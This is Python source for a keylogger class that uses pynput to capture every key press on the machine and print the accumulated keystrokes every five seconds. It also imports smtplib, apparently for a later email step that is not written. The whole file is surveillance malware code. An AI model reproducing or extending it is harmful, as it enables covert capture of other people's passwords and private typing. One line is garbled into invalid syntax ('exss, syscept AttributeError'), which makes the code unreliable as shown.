#!/usr/bin/python3
import pynput.keyboard, threading, smtplib
#class that read keyboard pressing and print it every 5 secongs

class Keylogger:
    def __init__(self):
        print("Hello")
        self.log = "" #variable that collect printed text
        self.key_dictionary = {"Key.space":"_", "Key.ctrl":"[CTRL]", "Key.shift":"[SHIFT]", "Key.tab":"[TAB] ", "Key.enter":"[ENTER]\n", "Key.backspace":"[backspace]"}
        
        
    def append_to_log(self, string):
        self.log += string
        
        
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        exss, syscept AttributeError:
            current_key = str(self.key_dictionary[str(key)])
        self.append_to_log(current_key)
    	
        
    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()
        
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
